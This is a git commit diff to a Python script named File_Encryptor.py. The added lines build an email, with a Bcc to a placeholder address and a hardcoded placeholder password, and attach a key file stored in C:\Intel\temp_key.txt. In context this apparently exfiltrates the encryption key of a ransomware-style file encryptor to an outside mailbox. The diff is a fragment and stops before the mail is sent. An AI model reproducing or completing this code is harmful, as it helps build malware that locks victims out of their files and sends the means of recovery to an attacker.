da020024361fe22d88b07e2773f009315f415714
sinistergeek <susanbhattraidon@gmail.com>
2023-12-18 20:26:29 +0545

    File_Encryptor

--- File_Encryptor.py
+++ File_Encryptor.py
@@ -104,4 +104,18 @@ while buffer!=0:
         receiver_email = "xys@gmail.com"
         password = 'password'
         message = MIMEMultipart()
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        message["Subject"] = subject
+        message["Bcc"] = receiver_email
+        message.attach(MIMEText(body,"plain"))
+        filename = 'C:\\Intel\\temp_key.txt'
 
+        with open(filename,"rb") as attachment:
+            part = MIMEBase("application","octet-stream")
+            part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition",f"attachment;filename={filename}")
+        message.attach(part)
+        text = message.as_string()
+        context = ssl.create_default_context()
